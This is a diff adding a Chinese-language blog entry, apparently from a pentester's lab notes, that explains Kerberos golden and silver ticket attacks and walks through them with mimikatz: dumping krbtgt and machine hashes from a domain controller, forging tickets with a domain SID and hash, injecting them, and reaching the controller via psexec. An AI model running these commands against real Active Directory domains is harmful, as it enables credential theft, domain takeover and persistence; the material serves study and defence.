@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>金银票据</title>
+      <link href="/2022/11/02/ticket/"/>
+      <url>/2022/11/02/ticket/</url>
+      
+        <content type="html"><![CDATA[<h2 id="黄金票据">黄金票据</h2><h3 id="0x00-前言">0x00 前言</h3><blockquote><p><code>Golden ticket</code>的作用是可以生成任意用户的tgt,那么问题就来了,是什么条件能够让他生成任意用户的tgt呢？还得要看kerberos认证的过程,在windows认证过程中，客户端将自己的信息发送给KDC,然后KDC使用krbtgt用户密码的hash作为密钥进行加密，生成TGT。</p></blockquote><p>那么如果获取到了<code>krbtgt</code>的密码hash值，就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门。</p><h3 id="0x01-条件">0x01 条件</h3><ul><li>krbtgt用户的hash(就意味着你已经有域控制器权限了)</li><li>域名称</li><li>域的SID值</li><li>要伪造的用户名</li></ul><h3 id="0x02-利用">0x02 利用</h3><p>1、先登录域控制器，dump krbtgt用户的hash值,获取域sid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102141758445.png" alt="image-20221102141758445" style="zoom:50%;"><p>这里讲一个小技巧，mimikatz 运行结果不容易复制，可以输出到一个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102142225774.png" alt="image-20221102142225774" style="zoom:50%;"><p>2、登录普通域用户生成TGT凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:fzm.cn /sid:S-1-5-21-804046751-2176370659-833378800 /krbtgt:3e000e366d0b6191732cfa7c8b77511e /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102142634618.png" alt="image-20221102142634618" style="zoom:50%;"><p>3、注入黄金票据并访问域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt gold.kirbi</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144604997.png" alt="image-20221102144604997" style="zoom:50%;"><img src="/2022/11/02/ticket/image-20221102144534774.png" alt="image-20221102144534774" style="zoom:50%;"><p>4、使用psexec连接域控</p><img src="/2022/11/02/ticket/image-20221102145229217.png" alt="image-20221102145229217" style="zoom:50%;"><p>5、查看票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144715512.png" alt="image-20221102144715512" style="zoom:50%;"><p>6、清除票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102144830745.png" alt="image-20221102144830745" style="zoom:100%;"><p>7、清除后，无法访问域控</p><img src="/2022/11/02/ticket/image-20221102144902480.png" alt="image-20221102144902480" style="zoom:50%;"><h2 id="白银票据">白银票据</h2><h3 id="0x00-前言-2">0x00 前言</h3><p><code>Sliver ticket</code>和<code>golden ticket</code>不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p><p>不像是<code>Golden ticket</code>，是由krgtgt用户的密码hash进行加密，伪造tgt可以获取到所有权限。</p><p>白银票据这里只是对单一的服务进行授权，利用过程和<code>golden ticket</code>差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt。</p><h3 id="0x01-利用">0x01 利用</h3><p>1、登录DC，抓取ntlm hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102151721436.png" alt="image-20221102151721436" style="zoom:50%;"><p>2、在普通域用户中生成票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:fzm.cn /sid:S-1-5-21-804046751-2176370659-833378800 /target:dc2.fzm.cn /service:cifs /rc4:5ae417641cc7e70629f4f148d06deb9a /user:administrator /ptt</span><br></pre></td></tr></table></figure><img src="/2022/11/02/ticket/image-20221102151642309.png" alt="image-20221102151642309" style="zoom:50%;"><p>3、查看票证访问域控</p><img src="/2022/11/02/ticket/image-20221102151813722.png" alt="image-20221102151813722" style="zoom:50%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> PTT </tag>
+            
+            <tag> 权限维持 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>利用psexec进行横向</title>
       <link href="/2022/11/02/psexec/"/>
       <url>/2022/11/02/psexec/</url>
